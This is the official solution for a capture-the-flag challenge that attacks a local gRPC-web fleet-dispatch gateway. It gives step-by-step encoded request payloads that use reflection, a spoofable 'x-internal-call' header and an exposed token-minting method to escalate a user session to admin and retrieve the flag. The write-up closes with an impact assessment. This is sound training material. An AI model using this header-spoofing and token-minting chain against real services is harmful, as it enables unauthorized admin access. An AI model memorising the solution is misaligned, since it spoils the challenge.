# DuckFleet — Official Solution

Target: `http://localhost:4000` (or wherever the gateway is published).
Credentials: `dispatch@duckurity.example` / `fleetflow-2024`.
Reference automation: `solution/solve.py` (`pip install protobuf`, then
`python3 solution/solve.py [base-url]`).

All bridge calls below are `POST /api/grpc/<package.Service>/<Method>` with
`Content-Type: application/grpc-web-text+proto` and a base64 body containing
`00 <4-byte big-endian length> <protobuf payload>` frames. Responses mirror
the format and terminate with an `0x80` trailer frame carrying
`grpc-status` / `grpc-message`.

## Step 1 — Learn the protocol from the console

Open the console, start DevTools → Network, and sign in. You will see:

```
POST /api/grpc/auth.AuthService/Login
Content-Type: application/grpc-web-text+proto

AAAAACwKGmRpc3BhdGNoQGR1Y2t1cml0eS5leGFtcGxlEg5mbGVldGZsb3ctMjAyNA==
```

Decoded, that body is one DATA frame (`00 0000002c`) around a
`LoginRequest{email, password}` protobuf (`0a1a... 120e...`). The reply is a
DATA frame with `LoginResponse{token, token_type, expires_in}` followed by a
trailer `grpc-status: 0`. This is the whole protocol: frames in, frames plus
a trailer out. Everything from here can be scripted.

## Step 2 — Log in and confirm the role

Replay the login call from a script → `LoginResponse.token` (JWT,
`role=USER`). Calling `auth.AuthService/WhoAmI` with
`Authorization: Bearer <token>` and an empty message body (`AAAAAAAAAA==`,
i.e. a zero-length DATA frame) returns:

```
UserInfo{user_id: "a41f9c02-…", email: "dispatch@duckurity.example",
         display_name: "Mara Quill", role: "USER"}
```

## Step 3 — Reflection through the gateway

The gateway forwards any well-formed call, so probe the standard reflection
endpoint `grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo`
(one request per POST; the bridge relays the response stream back).

`ServerReflectionRequest{host: "…", list_services: ""}`:

```
message hex : 0a06736f6c7665723200
text b64    : AAAAAAoKBnNvbHZlcjIA
```

Response DATA frame decodes to services:

```
admin.AdminService, auth.AuthService, events.EventService,
fleet.FleetService, grpc.health.v1.Health,
grpc.reflection.v1alpha.ServerReflection
```

Then `file_containing_symbol` for each service, e.g. for
`admin.AdminService`:

```
message hex : 0a06736f6c7665721a1261646d696e2e41646d696e53657276696365
text b64    : AAAAABwKBnNvbHZlchoSYWRtaW4uQWRtaW5TZXJ2aWNl
```

The reply carries `FileDescriptorProto` bytes (plus dependencies, so a
dynamic pool can be built directly). Reconstructing all four application
protos reveals the interesting surface the console never uses:

- `events.EventService/Subscribe(SubscribeRequest) → stream PlatformEvent`
- `admin.AdminService/IssueToken(IssueTokenRequest{user_id})`
- `admin.AdminService/GetFlag(Empty)`

## Step 4 — The obvious path is correctly gated (dead end)

`GetFlag` with the dispatcher token:

```
→ POST /api/grpc/admin.AdminService/GetFlag   (Empty body: AAAAAAA=)
← DATA { FlagResponse … } is NOT returned. Trailer instead:
  grpc-status: 7
  grpc-message: ADMIN_ROLE_REQUIRED
```

Token forgery goes nowhere either: `alg:none` and wrong-signature tokens are
rejected with `16 INVALID_TOKEN`, and smuggling `x-user-id: <admin>` as
metadata still yields `7` — identity comes only from the verified JWT.

## Step 5 — The downgrade you can see

`SubscribeRequest{categories: [AUDIT, AUTH]}` (`0a020102` → `AAAAAAQKAgEC`)
with the dispatcher token returns `200 OK` with response header:

```
x-acl: public
```

Only `fleet_heartbeat` events arrive. The request was not rejected — it was
silently reduced. Compare that with the `x-acl` concept: something decided
this caller is "public". The gateway maps request headers to gRPC metadata,
so the natural question is what that decision is based on.

## Step 6 — Ask as an insider

Repeat the subscription with one extra header:

```
x-internal-call: true
```

Response header flips to `x-acl: internal`, and the stream starts delivering
`PlatformEvent{category: AUDIT, type: "session_audit", payload: <bytes>}`.
The payload bytes are a `SessionAudit` message (descriptor already recovered
via reflection). Within one 30-second audit cycle you will see:

```
SessionAudit{user_id: "e85bbf46-7fcd-4c9e-b5b4-33a6fcd8b945",
             email: "ops-admin@duckurity.example",
             action: "KEY_ROTATION_REMINDER"}
```

A nearby `TokenIssuedAudit{issued_for: "svc-scheduler", scope: "fleet:write"}`
record is noise — it carries no token value. Capture the admin user id.

## Step 7 — Confirm the minting behavior on yourself

`IssueTokenRequest{user_id: <your own id>}` with the dispatcher token plus
`x-internal-call: true` returns `200 OK` and an `IssueTokenResponse` whose
JWT still carries `role=USER` — the method mints for whatever id it is
given, resolving the role from the database. Without the header it answers
`7 FORBIDDEN`; without a token, `16`.

## Step 8 — Mint for the admin

Same call with `user_id` set to the captured admin id:

```
message hex : 0a2465383562626634362d376663642d346339652d623562342d333361366663643862393435
text b64    : AAAAACYKJGU4NWJiZjQ2LTdmY2QtNGM5ZS1iNWI0LTMzYTZmY2Q4Yjk0NQ==
```

`IssueTokenResponse.token` now decodes to `role=ADMIN`.

## Step 9 — Take the secret token

`GetFlag` with the admin JWT:

```
← DATA frame: FlagResponse{flag: "DUCK{…}", issued_to: "ops-admin@duckurity.example"}
← trailer: grpc-status: 0
```

## Impact assessment

- **Confidentiality**: any authenticated user can read the internal audit feed
  (admin identities, operational actions) and then mint an admin session,
  exposing the platform secret and, in a production analogue, every
  admin-gated operation behind it.
- **Integrity/authentication**: the token-issuance helper breaks the binding
  between proof-of-identity and session identity — possession of *any* valid
  session plus one header yields *any* identity.
- **Root pattern**: authorization grounded in client-controlled metadata
  (`x-internal-call`) instead of verified claims, combined with an internal
  method exposed on the external surface and schema disclosure via
  reflection. Each stage alone looks minor; chained, they are total
  compromise. See `REMEDIATION.md` for fixes.
